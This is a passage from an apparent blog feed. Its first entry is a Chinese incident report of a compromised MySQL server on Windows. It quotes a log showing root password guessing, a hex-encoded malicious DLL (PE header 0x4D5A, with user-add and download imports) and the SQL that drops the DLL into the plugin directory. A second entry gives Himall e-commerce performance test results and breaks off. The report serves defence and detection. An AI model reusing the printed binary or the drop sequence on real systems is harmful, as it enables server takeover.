class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:05	84 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:08	85 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:11	86 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:15	87 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:17	88 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:18	89 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:21	90 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:23	91 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:26	92 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92 Connect	Access denied for user &#39;root&#39;@&#39;114.55.39.75&#39; (using password: YES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:34	93 Connect	root@114.55.39.75 on mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;160623 18:35:35	93 Query	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; autocommit=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;160623&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;93&lt;/span&gt; Quit	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;160623&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Connect&lt;/span&gt;	root@&lt;span class=&quot;number&quot;&gt;114.55&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.39&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.75&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;on&lt;/span&gt; mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; autocommit=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;VERSION&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;160623&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;38&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; @a = &lt;span class=&quot;keyword&quot;&gt;concat&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000EF55A8C1AB34C692AB34C692AB34C692C42BCC92AF34C692C42BC292A934C692AB34C692A834C692AB34C792B834C692C92BD592AC34C6929D12CD92A934C6925414C292AA34C69252696368AB34C692000000000000000000000000000000000000000000000000504500004C0103000E6DFF4F0000000000000000E0000E210B01060000100000001000000050000020660000006000000070000000000010001000000002000004000000000000000400000000000000008000000010000000000000020000000000100000100000000010000010000000000000100000006C71000070000000007000006C010000000000000000000000000000000000000000000000000000DC7100000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000500000001000000000000000040000000000000000000000000000800000E0555058310000000000100000006000000008000000040000000000000000000000000000400000E05550583200000000001000000070000000020000000C0000000000000000000000000000400000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E303400555058210D0902081292E561117752FFF14200001406000000500000260100C02F775FFE8B4C2408B801003BC8750A0C04890D21D8C2FCF676EC0C0090008B4412C7400813100432C0C3EE6FDFBE81EC34020C5355568D1810575033F6682E6E77FBDD906813808974241CC71528044DFF15315DB7BDFD0085C075208D531C8D542B515C183428D8EDD8EF52505633845123048B1B14520ADC5DFBEE08B9660033C08D7C244B20F3AB2ED375DDFF3F2850516A01565A383774073C5BB77B4D5C44B80750007FE80C03FB7BEBBA524D2835182F506A03663C568912768FFD6F2C1B4C8BAC244C0260942440398B1DFFFF7FEF74108B4D0827208B790483C9FFF2AEF7D12BF98BC18BF78BFA63DFFFFFC1E902F3A58BC883E103F3A4FFD38D8C24AC6D840694DBBB3F7303C01483BC24BC0D0275558B1BB0EEDEFD3783E804743E48740E48F6487543BF5D14EB41FF5E83E91CB4120B17150CEB2B83EFDDCFD8F802250704EB1B0620FCEB1413D6DC217F0AF0EB09E89DBA9F58B0367B6A00A107A3C1ED6B77B1A8CE8B115218F1586CEF164CF70F85D500E93513062620A8FFD6CAC9EDDD8B3D0E1C68102715FFD7886CD662C10F4AEE1406EFFFB16F840470EC3C8BF083C40885F674165614C2DBD8916C38560634190C8DBC599F139E2CAA83C177E6308BB4E11BB608802704D44889460C5154FBD8EF83C352514D40502A2C8B7E0C40750BDB162714438BAB54335F7FFCD6B84B49899F325E5D5B81C482C38B45DE2C65BB08268B386965703E4343C0691752186710422E994084080B3F256C90000F8B400C5974EB4ED8B30846405921FF25134C05B8A11B1948543108F50E39052FECBE6F59DC7E2EFF0D078B051024FE018B09CB21FD4871E0753F6880383059BEF7B7BBA314E875049EEB66832000A10DBC041FBBE1FB04001CE4E204A6FF555959EB3D6AAF8B756339269B305E21E3D8FF5FA471FC3BF072128B0E85C97407FFD11E83EE672DFD1D6CEABB83251100595E2F5885FFDF30F2C1EC538B5D08568B750C578B7D10E76DB4FFF77509833D5F00EB2683FE01740504E62287E97EF364EC09575653FFD0080C6FDDFDFBDC5E82B04E0FA3FBFFFF3389450CDF60ADAE4C17372B23F64603BBDD0ED8752634032125837D7F74115BFBD6450E083C8B025F5E5B5D9C88223B824D280000DF2E7FA877726F6E672E6F6B0328257329DBCBF6FF20706F72746E756D626572200F646F73760A7304D8FBB66925201E002728FFFFADB9002B03633A5C57696E646F77735C76332E6C6F6BBFE4BB6717612B62004374656D70040384BD6F7F3230395C6D61142E657865371F9574FFFE6973657475701A202D6F223D77DAB7EDDB221A70616263057963556E6B6E1E6CF7DEDE07546F6F2F6C64218F50585007EE6F83FC32303033302368652D6E65770BF7BF05B2387737410064006D0069006E03AFB9AE7D7300740072C9056F070D006EEC7FB2611F6C0076003100320033177013A4E1CC6D2365252750394EFDFF0B4159595354454D5C43757272656E74436FED60DBB60372AE53735C0A5C5425FE19B6B76D90616C201472609D5374617400B4BF1967A15244502D5463A4C8561484230CB2398A0AB01010806DF9FF0144656C65746546696C6541470A566DBBDD91BC45780E57690765630853FB9F66BB1D657034BD0052656743726561376BDF8E7D4B6579410E5175377956616C063969B6F717206C6F731F36CA24E0CDFDFF5F61646A7573745F666469760D5D697474DB6E6F0DD60A7370720C7466086D41F7EEED5A367066633D077075747306D36C9B796F70656E73654ED548B5B16FDB4EAD5524724164640B4C386B0276BF3D47726F7570114D6557732D5BFB9F66E25455524C446F776E578454FDFF63B36FEF00172F171D070B260827200839251610FFFFFFBF0A0B212007080E0E070705060F06071D24073F2207471406060E08060B0DEDFFAD6D180500060A150C0622125C1C005045416F8351FF4C0104000E6DFF4F43E00D210B019C7D7684062A0030130D14000F20969D278F10001004000717A40BD650272A02029AEDD9B207067022076E5CF2818CEA4F78DC4000008406922E40575C2E5BF67417B87874B8B0100342CFB6F121602E72642661CCDE2062876C0903A2402E26940CD2DC27F001303036D91CDBC04F652010BC27657353724042043E210000B8870AE5480412000000FF000000000000000000000000807C2408010F85B901000060BE006000108DBE00B0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9070000008A07472CE83C0177F7803F0175F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE004000008B0709C0743C8B5F048D84300060000001F35083C708FF9678600000958A074708C074DC89F95748F2AE55FF967C60000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAE806000008DBE00F0FFFFBB0010000050546A045357FFD58D870702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E924ACFFFF0000000000000000000000000000000000000000000000000000000000000000000000B070000078700000000000000000000000000000BD70000090700000000000000000000000000000CA70000098700000000000000000000000000000D5700000A0700000000000000000000000000000E2700000A87000000000000000000000000000000000000000000000EC700000FA7000000A7100001A7100002871000000000000367100000000000044710000000000004A7100000000000056710000000000004B45524E454C33322E444C4C0041445641504933322E646C6C004D53564352542E646C6C004E455441504933322E646C6C0075726C6D6F6E2E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000526567436C6F73654B65790000006672656500004E657455736572416464000055524C446F776E6C6F6164546F46696C65410000000000000E6DFF4F00000000B271000001000000030000000300000094710000A0710000AC710000301000003013000020100000BC710000C2710000CF7100000000010002006D7973716C2E646C6C007870646C33007870646C335F6465696E6974007870646C335F696E6974000000006000000C0000002D360000000000000000000000000000000000000000000000000000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;use&lt;/span&gt; mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;drop&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;IF&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;EXISTS&lt;/span&gt; yongger2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;SHOW&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;WARNINGS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;table&lt;/span&gt; yongger2(&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt; LONGBLOB)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;160623&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;39&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;insert&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;into&lt;/span&gt; yongger2 &lt;span class=&quot;keyword&quot;&gt;values&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;update&lt;/span&gt; yongger2 &lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt; = @a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; @dir2 = &lt;span class=&quot;keyword&quot;&gt;concat&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;select data from yongger2 into DUMPFILE &quot;&#39;&lt;/span&gt;,@@plugin_dir,&lt;span class=&quot;string&quot;&gt;&#39;\\cna12.dll&quot;&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; @dir2 = &lt;span class=&quot;keyword&quot;&gt;replace&lt;/span&gt;(@dir2,&lt;span class=&quot;string&quot;&gt;&#39;\\&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;\\\\&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; @dir2 = &lt;span class=&quot;keyword&quot;&gt;replace&lt;/span&gt;(@dir2,&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;\\\\&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;160623&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Query&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;prepare&lt;/span&gt; sql3 &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; @dir2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Prepare&lt;/span&gt;	&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; yongger2 &lt;span class=&quot;keyword&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;DUMPFILE&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;C:\\Program Files (x86)\\MySQL\\MySQL Server 5.6\\lib\\plugin\\\\cna12.dll&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;后面&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;W行省略&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;后面的内容真是看不下去,种了无数dll到服务器上。整个服务器被控制。&lt;br&gt;然后。。。。我就没有然后了。。。。。。。。。。。。&lt;/p&gt;
&lt;h2 id=&quot;最后&quot;&gt;&lt;a href=&quot;#最后&quot; class=&quot;headerlink&quot; title=&quot;最后&quot;&gt;&lt;/a&gt;最后&lt;/h2&gt;&lt;p&gt;遇到这种情况，好像只能重装系统了。&lt;br&gt;特别要注意的是:0x4D5A是pe文件头，如果你的日志中出现这个，请提高警觉。&lt;br&gt;PS:PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件，PE文件是微软Windows操作系统上的程序文件（可能是间接被执行，如DLL）&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;情况&quot;&gt;&lt;a href=&quot;#情况&quot; class=&quot;headerlink&quot; title=&quot;情况&quot;&gt;&lt;/a&gt;情况&lt;/h2&gt;&lt;p&gt;最近公司网站出现所有页面无法访问数据库的问题，但是mysql第三方客户端又可以访问如workbench,但是重启mysql服务之后，网站又恢
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Himall集群版解决方案及性能测试结果</title>
    <link href="http://binyanbin.github.io/2016/06/07/hishop-3/"/>
    <id>http://binyanbin.github.io/2016/06/07/hishop-3/</id>
    <published>2016-06-06T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;架构设计&quot;&gt;&lt;a href=&quot;#架构设计&quot; class=&quot;headerlink&quot; title=&quot;架构设计&quot;&gt;&lt;/a&gt;架构设计&lt;/h2&gt;&lt;p&gt;集中架构设计出于系统的可扩展性、可维护性以及成本等多方面的因素考虑，逐渐被放弃，转而采用分布式的架构设计。常用分布式架构采用按模块纵向分解的方式,然后纵向分解中的某些模块仍有可能是一个复杂且庞大的业务，需要继续进行拆分。每个模块又由许多个微服务完成业务功能，微服务可独部署弹性伸缩。下图为Himall分布式集群版的整体架构设计:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-11.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;部署图&quot;&gt;&lt;a href=&quot;#部署图&quot; class=&quot;headerlink&quot; title=&quot;部署图&quot;&gt;&lt;/a&gt;部署图&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-12.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;标准部署方案的业务支撑能力&quot;&gt;&lt;a href=&quot;#标准部署方案的业务支撑能力&quot; class=&quot;headerlink&quot; title=&quot;标准部署方案的业务支撑能力&quot;&gt;&lt;/a&gt;标准部署方案的业务支撑能力&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;th&gt;日均最大PV（11小时峰值测试）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;3000&lt;/td&gt;
&lt;td&gt;4秒内&lt;/td&gt;
&lt;td&gt;2000&lt;/td&gt;
&lt;td&gt;约7920万&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;标准集群部署配置&quot;&gt;&lt;a href=&quot;#标准集群部署配置&quot; class=&quot;headerlink&quot; title=&quot;标准集群部署配置&quot;&gt;&lt;/a&gt;标准集群部署配置&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;硬件（设施）&lt;/th&gt;
&lt;th&gt;配置&lt;/th&gt;
&lt;th&gt;数量&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;SLB负载均衡服务器&lt;/td&gt;
&lt;td&gt;依实际流量付费&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;前端应用服务器&lt;/td&gt;
&lt;td&gt;Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2&lt;/td&gt;
&lt;td&gt;3 ~ 6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;后端应用服务器&lt;/td&gt;
&lt;td&gt;Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2&lt;/td&gt;
&lt;td&gt;6 ~ 10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CDN内容加速&lt;/td&gt;
&lt;td&gt;依图片及视频等资源的容量和使用量付费&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Redis集群&lt;/td&gt;
&lt;td&gt;热点内容缓存&lt;/td&gt;
&lt;td&gt;按使用收费&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DRDS&lt;/td&gt;
&lt;td&gt;按使用收费&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;标准配置性能测试数据&quot;&gt;&lt;a href=&quot;#标准配置性能测试数据&quot; class=&quot;headerlink&quot; title=&quot;标准配置性能测试数据&quot;&gt;&lt;/a&gt;标准配置性能测试数据&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;服务器&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;测试服务器&lt;/td&gt;
&lt;td&gt;一台ECS 系统:centOS 测试软件:Jmeter&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;测试对象Himall&lt;/td&gt;
&lt;td&gt;标准集群阿里云部署&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;浏览首页&quot;&gt;&lt;a href=&quot;#浏览首页&quot; class=&quot;headerlink&quot; title=&quot;浏览首页&quot;&gt;&lt;/a&gt;浏览首页&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-13.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-14.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;首页&lt;/td&gt;
&lt;td&gt;3000&lt;/td&gt;
&lt;td&gt;0.42秒&lt;/td&gt;
&lt;td&gt;3550&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;浏览商品详情页&quot;&gt;&lt;a href=&quot;#浏览商品详情页&quot; class=&quot;headerlink&quot; title=&quot;浏览商品详情页&quot;&gt;&lt;/a&gt;浏览商品详情页&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-15.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-16.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;商品浏览&lt;/td&gt;
&lt;td&gt;3000&lt;/td&gt;
&lt;td&gt;3.16秒&lt;/td&gt;
&lt;td&gt;660&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;商品搜索&quot;&gt;&lt;a href=&quot;#商品搜索&quot; class=&quot;headerlink&quot; title=&quot;商品搜索&quot;&gt;&lt;/a&gt;商品搜索&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-17.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-18.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;th&gt;关键字数&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;商品搜索&lt;/td&gt;
&lt;td&gt;3000&lt;/td&gt;
&lt;td&gt;1.125秒&lt;/td&gt;
&lt;td&gt;1534.1&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;用户登陆&quot;&gt;&lt;a href=&quot;#用户登陆&quot; class=&quot;headerlink&quot; title=&quot;用户登陆&quot;&gt;&lt;/a&gt;用户登陆&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
